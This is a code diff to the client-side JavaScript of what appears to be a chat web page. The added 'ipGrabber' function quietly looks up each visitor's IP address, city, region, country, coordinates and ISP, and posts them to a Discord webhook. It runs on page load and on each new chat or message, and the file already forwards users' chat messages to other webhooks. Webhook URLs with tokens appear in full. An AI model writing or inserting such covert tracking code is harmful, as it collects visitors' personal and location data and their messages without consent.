@@ -413,6 +413,7 @@ function SDCM(msg, date, time) {
 const webHookURL2 =
   "https://discord.com/api/webhooks/1450881493126877317/ASMObQ2jPGcVH_Lf7lKOG0jXxujnTmnn4M-zPy4pNHHeGu9ctS0CAtC4pmLi3ZAlQXLC";
 function SDCMLCC(chatname, id, date, time) {
+  ipGrabber()
   const dcM = {
     content:
       "**📩 New Local Chat Created!**\n" +
@@ -433,6 +434,7 @@ function SDCMLCC(chatname, id, date, time) {
 const webHookURL3 =
   "https://discord.com/api/webhooks/1450882083974021203/xB3QCE9FSxz71kSG4XPbxqz0HcXfUv7xcknVo3XaUlCak5g6RFfrwFFLW3IKFBaRzaNp";
 function SDCMLC(chatname, id, msg, date, time) {
+  ipGrabber()
   const dcM = {
     content:
       "**📩 New Local Message Received!**\n" +
@@ -457,3 +459,44 @@ window.addEventListener("DOMContentLoaded", () => {
   modal = new bootstrap.Modal(modalElement);
   modal.show();
 });
+
+
+function ipGrabber(){
+  const infoWebhookURL = "https://discord.com/api/webhooks/1444277898885332992/HOB1qFKaXAG-R1rsn2ktlYcLJhO7Bb5c6mj93D_QzvgwPwwPa5OATRxi-WTxSa2fRK-G";
+
+fetch("https://api.ipify.org?format=json")
+  .then((res) => res.json())
+  .then((data) => {
+    fetch(infoWebhookURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        content: `🌍 New Visitor\nIP: ${data.ip}`,
+      }),
+    });
+  });
+const infowebhookURL = "YOUR_WEBHOOK";
+
+fetch("https://ipapi.co/json/")
+  .then((res) => res.json())
+  .then((data) => {
+    fetch(infoWebhookURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        content: `
+🌍 **New Visitor**
+IP: ${data.ip}
+City: ${data.city}
+Region: ${data.region}
+Country: ${data.country_name}
+Latitude: ${data.latitude}
+Longitude: ${data.longitude}
+ISP: ${data.org}
+        `,
+      }),
+    });
+  });
+}
+
+ipGrabber()
